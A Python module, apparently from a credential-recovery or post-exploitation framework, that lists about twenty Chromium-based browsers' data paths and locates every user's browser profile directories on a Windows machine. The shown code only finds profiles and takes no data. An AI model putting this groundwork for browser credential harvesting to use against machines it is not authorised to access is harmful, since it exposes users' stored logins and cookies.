# coding: utf-8

try:
	import os
	import json
	import subprocess
except ImportError:
	pass

from modules.windows.windows_module import WindowsModule
from api import user


CHROMIUM_WINDOWS_NAMES = [
	'{LOCALAPPDATA}\\7Star\\7Star\\User Data',
	'{LOCALAPPDATA}\\Amigo\\User Data',
	'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data',
	'{LOCALAPPDATA}\\CentBrowser\\User Data',
	'{LOCALAPPDATA}\\Chedot\\User Data',
	'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data',
	'{LOCALAPPDATA}\\Chromium\\User Data',
	'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data',
	'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data',
	'{LOCALAPPDATA}\\Elements Browser\\User Data',
	'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data',
	'{LOCALAPPDATA}\\Google\\Chrome\\User Data',
	'{LOCALAPPDATA}\\Kometa\\User Data',
	'{APPDATA}\\Opera Software\\Opera Stable',
	'{LOCALAPPDATA}\\Kometa\\User Data',
	'{LOCALAPPDATA}\\Orbitum\\User Data',
	'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data',
	'{LOCALAPPDATA}\\Torch\\User Data',
	'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data',
	'{LOCALAPPDATA}\\Vivaldi\\User Data',
	'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data',
]
PROFILES = []
PROFILES_CHECK = False

class ChromiumModule(WindowsModule):

	def __init__(self, name, version, file, dependencies):
		WindowsModule.__init__(
			self,
			name=name,
			version=version,
			file=file,
			dependencies=dependencies+['os', 'json', 'subprocess'],
		)

	def has(self):
		return super().has() and self.get_profiles()

	def get_profiles(self) -> list:
		global PROFILES_CHECK, CHROMIUM_WINDOWS_NAMES, PROFILES

		if PROFILES_CHECK:
			return PROFILES
		else:
			PROFILES_CHECK = True
			configs = []
			if os.environ.get('LOCALAPPDATA'):
				localdata_path = os.environ.get('LOCALAPPDATA').replace(user.get_username(), '{user}')
			else:
				localdata_path = 'C:\\Users\\{user}\\AppData\\Local'
			if os.environ.get('APPDATA'):
				appdata_path = os.environ.get('APPDATA').replace(user.get_username(), '{user}')
			else:
				appdata_path = 'C:\\Users\\{user}\\AppData\\Roaming'
			for name in CHROMIUM_WINDOWS_NAMES:
				if '{LOCALAPPDATA}' in name:
					for localdata in self.get_users_path_to(localdata_path):
						if os.path.isdir(name.format(LOCALAPPDATA=localdata)):
							configs.append(name.format(LOCALAPPDATA=localdata))
				if '{APPDATA}' in name:
					for appdata in self.get_users_path_to(appdata_path):
						if os.path.isdir(name.format(APPDATA=appdata)):
							configs.append(name.format(APPDATA=appdata))

			for config in configs:
				profiles_name = []
				if os.path.isfile(config + '\\Local State'):
					with open(config + '\\Local State') as file:
						local_state_json = json.load(file)

					if local_state_json and 'profile' in local_state_json and 'info_cache' in local_state_json['profile']:
							profiles_name += local_state_json['profile']['info_cache'].keys()
				if not profiles_name:
					profiles_name.append('Default')
					profiles_name.append('')

				for name in profiles_name:
					path = config + '\\' + name
					if path.endswith('\\'):
						path = path[:-1]
					if os.path.isdir(path):
						PROFILES.append(path)
		return PROFILES
